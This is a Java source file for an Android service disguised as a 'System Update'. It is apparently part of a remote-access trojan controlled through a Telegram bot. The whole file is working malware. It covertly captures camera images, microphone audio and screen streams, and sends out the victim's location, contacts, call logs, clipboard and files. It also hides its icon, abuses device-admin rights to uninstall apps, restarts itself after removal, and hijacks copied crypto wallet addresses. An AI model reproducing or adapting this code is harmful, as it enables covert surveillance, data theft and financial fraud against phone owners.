package com.sys.updater;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private boolean isVncRunning = false;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    // HNA 7ET ADDRESS DYALEK
    private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
        
        Exfil.send("✅ System Bot is Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
        new Thread(this::pollTelegram).start();
    }

    private void pollTelegram() {
        while (isRunning) {
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                InputStream is = new URL(urlStr).openStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        if (update.has("message")) {
                            String text = update.getJSONObject("message").optString("text", "");
                            handleCommand(text);
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(final String cmd) {
        mainHandler.post(() -> {
            if (cmd.equals("/cam")) takePhoto();
            else if (cmd.equals("/mic")) recordAudio();
            else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
            else if (cmd.equals("/loc")) getLocation();
            else if (cmd.equals("/files")) listFiles();
            else if (cmd.startsWith("/get ")) Exfil.sendFile(cmd.substring(5).trim(), "Document", "File");
            else if (cmd.equals("/hide")) hideIcon();
            else if (cmd.equals("/contacts")) getContacts();
            else if (cmd.equals("/calls")) getCallLogs();
            else if (cmd.equals("/clip")) getClipboard();
            else if (cmd.equals("/vnc")) {
                isVncRunning = !isVncRunning;
                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started (Every 3s)" : "🖥️ VNC Stream Stopped");
                if (isVncRunning) startVncStream();
            }
            else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
            else if (cmd.equals("/apps")) getInstalledApps();
            else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
            else if (cmd.equals("/restart")) {
                startService(new Intent(this, TelegramService.class));
                Exfil.send("🔄 Service Restarted.");
            }
        });
    }

    // ================== VNC (Screen Streaming) ==================
    private void startVncStream() {
        if (!isVncRunning) return;
        if (KeyloggerService.instance != null) {
            KeyloggerService.instance.captureScreenSilent();
        }
        mainHandler.postDelayed(this::startVncStream, 3000);
    }

    // ================== CRYPTO CLIPBOARD HIJACK ==================
    private void startCryptoClipboardHijack() {
        Exfil.send("💰 Crypto Clipboard Hijack Started. Waiting for victim...");
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboard.addPrimaryClipChangedListener(() -> {
            try {
                if (clipboard.hasPrimaryClip()) {
                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                    String text = item.getText().toString();
                    if (text.startsWith("0x") && text.length() > 30) {
                        ClipData clip = ClipData.newPlainText("text", ATTACKER_CRYPTO_ADDRESS);
                        clipboard.setPrimaryClip(clip);
                        Exfil.send("💸 Hijacked Crypto Address! Replaced with yours.");
                    }
                }
            } catch (Exception e) {}
        });
    }

    // ================== INSTALLED APPS ==================
    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📱 Installed Apps:\n\n");
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo app : apps) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
            }
        }
        Exfil.send(sb.toString());
    }

    // ================== UNINSTALL APP ==================
    private void uninstallApp(String packageName) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.setUninstallBlocked(admin, packageName, false);
                dpm.removeActiveAdmin(admin); // Bypass
                
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
                Exfil.send("🗑️ Requested uninstall for: " + packageName);
                dpm.setActiveAdmin(admin, true); // Re-enable admin
            } else {
                Exfil.send("❌ Device Admin not enabled. Cannot uninstall silently.");
            }
        } catch (Exception e) {
            Exfil.send("Uninstall Error: " + e.getMessage());
        }
    }

    // ================== CONTACTS ==================
    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Exfil.send("❌ No Contacts permission.");
            return;
        }
        StringBuilder sb = new StringBuilder("👥 Contacts:\n\n");
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" : ").append(phone).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {
            Exfil.send("Contacts Error: " + e.getMessage());
        }
    }

    // ================== CALL LOGS ==================
    private void getCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Exfil.send("❌ No Call Log permission.");
            return;
        }
        StringBuilder sb = new StringBuilder("📞 Last Calls:\n\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    sb.append(type).append(" : ").append(number).append(" (").append(duration).append("s)\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {
            Exfil.send("Calls Error: " + e.getMessage());
        }
    }

    // ================== CLIPBOARD ==================
    private void getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                String text = item.getText().toString();
                Exfil.send("📋 Clipboard:\n" + text);
            } else {
                Exfil.send("📋 Clipboard is empty.");
            }
        } catch (Exception e) {
            Exfil.send("Clipboard Error: " + e.getMessage());
        }
    }

    // ================== LOCATION ==================
    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Exfil.send("❌ Location permission not granted.");
                return;
            }
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude();
                Exfil.send("📍 Location:\n" + mapsUrl);
            } else {
                Exfil.send("❌ Location not available. Try enabling GPS.");
            }
        } catch (Exception e) {
            Exfil.send("Location Error: " + e.getMessage());
        }
    }

    // ================== FILE MANAGER ==================
    private void listFiles() {
        try {
            File dir = new File("/sdcard/Download");
            if (!dir.exists()) dir = new File("/sdcard/");
            
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder("📁 Files in " + dir.getAbsolutePath() + ":\n\n");
            if (files != null) {
                for (int i = 0; i < Math.min(files.length, 30); i++) {
                    sb.append(files[i].getName()).append("\n");
                }
                sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {
            Exfil.send("File Error: " + e.getMessage());
        }
    }

    // ================== STEALTH MODE ==================
    private void hideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            Exfil.send("🕵️ App icon hidden.");
        } catch (Exception e) {
            Exfil.send("Hide Error: " + e.getMessage());
        }
    }

    // ================== CAMERA ==================
    private void takePhoto() {
        Exfil.send("📷 Opening Camera...");
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1]; // Front
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        try { session.capture(builder.build(), null, null); } catch (Exception e) {}
                                    }, 1000);
                                    
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes); fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
                                        } catch (Exception e) {}
                                        image.close(); camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {}
    }

    // ================== MIC ==================
    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare(); recorder.start();
            Exfil.send("🎙️ Recording 10s...");
            
            new Thread(() -> {
                try { Thread.sleep(10000); } catch (Exception e) {}
                mainHandler.post(() -> {
                    try {
                        recorder.stop(); recorder.release();
                        Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
                    } catch (Exception e) {}
                });
            }).start();
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        // Ila l'user sed l'app mn l'recents, n-3awdo n-ch3lo
        Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
        restartService.setPackage(getPackageName());
        startService(restartService);
    }
                        }
